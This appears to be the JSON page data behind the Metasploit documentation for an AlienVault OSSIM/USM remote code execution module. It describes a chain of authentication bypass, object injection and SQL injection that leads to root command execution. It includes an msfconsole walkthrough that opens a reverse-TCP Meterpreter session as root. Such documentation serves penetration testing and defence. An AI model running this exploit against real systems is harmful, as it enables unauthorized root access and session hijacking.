{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/alienvault_exec","result":{"data":{"moduleMetadataJson":{"id":"9f3ac246-3f35-597f-8e36-f5e25b9bb13d","name":"AlienVault OSSIM/USM Remote Code Execution","fullname":"exploit/linux/http/alienvault_exec","description":"This module exploits object injection, authentication bypass and ip spoofing vulnerabilities all together.\n        Unauthenticated users can execute arbitrary commands under the context of the root user.\n\n        By abusing authentication bypass issue on gauge.php lead adversaries to exploit object injection vulnerability\n        which leads to SQL injection attack that leaks an administrator session token. Attackers can create a rogue\n        action and policy that enables to execute operating system commands by using captured session token. As a final step,\n        SSH login attempt with an invalid credentials can trigger a created rogue policy which triggers an action that executes\n        operating system command with root user privileges.\n\n        This module was tested against following product and versions:\n        AlienVault USM 5.3.0, 5.2.5, 5.0.0, 4.15.11, 4.5.0\n        AlienVault OSSIM 5.0.0, 4.6.1","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/alienvault_exec","documentationSlug":"/modules/documentation/exploit/linux/http/alienvault_exec","referencesSlug":"/modules/references/exploit/linux/http/alienvault_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits object injection, authentication bypass and ip spoofing vulnerabities all together. Unauthenticated users can execute arbitrary commands under the context of the root user.</p>\n<p>By abusing authentication bypass issue on gauge.php lead adversaries to exploit object injection vulnerability\nwhich leads to SQL injection attack that leaks an administrator session token. Attackers can create a rogue\naction and policy that enables to execute operating system commands by using captured session token. As a final step,\nSSH login attempt with a invalid credentials can trigger a created rogue policy which triggers an action that executes\noperating system command with root user privileges.</p>\n<p>This module was tested against AlienVault USM 5.2.5.</p>\n<p><strong>Vulnerable Application Installation Steps</strong></p>\n<p>Major version of older releases can be found at following URL.\n<a href=\"http://downloads.eu.alienvault.com/c/download\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://downloads.eu.alienvault.com/c/download</a></p>\n<p>You can download file named as AlienVault-USM<em>trial</em>5.2.5.zip which contains a OVA file.\nIn order to complete installation phase, you have to apply <a href=\"https://www.alienvault.com/try-it-free\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.alienvault.com/try-it-free</a> .\nOnce alienvault sales team validate your information, you will be able to complete the installation with your e-mail address.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>A successful check of the exploit will look like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/http/alienvault_exec \nmsf exploit(alienvault_exec) &gt; set RHOST 12.0.0.137\nRHOST =&gt; 12.0.0.137\nmsf exploit(alienvault_exec) &gt; set LHOST 12.0.0.1 \nLHOST =&gt; 12.0.0.1\nmsf exploit(alienvault_exec) &gt; check\n[+] 12.0.0.137:443 The target is vulnerable.\nmsf exploit(alienvault_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 12.0.0.1:4445 \n[*] Hijacking administrator session\n[+] Admin session token : PHPSESSID=2gbhp8j5f2af0vu5es5t3083q4\n[*] Creating rogue action\n[+] Action created: aWbhnZFHqYbUbNW\n[*] Retrieving rogue action id\n[+] Corresponding Action ID found: D62A1D4A6D3AEEA65F99B606B02197A1\n[*] Retrieving policy ctx and group values\n[+] CTX Value found: 5E22D6A9E79211E6B8E4000C29F647D7\n[+] GROUP Value found: 00000000000000000000000000000000\n[*] Creating a policy that uses our rogue action\n[+] Policy created: ASdKHQOZVONGzfU\n[*] Activating the policy\n[+] Rogue policy activated\n[*] Triggering the policy by performing SSH login attempt\n[+] SSH - Failed authentication. That means our policy and action will be trigged..!\n[*] Sending stage (38500 bytes) to 12.0.0.137\n[*] Meterpreter session 6 opened (12.0.0.1:4445 -&gt; 12.0.0.137:51674) at 2017-01-31 14:13:49 +0300\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9f3ac246-3f35-597f-8e36-f5e25b9bb13d"}}}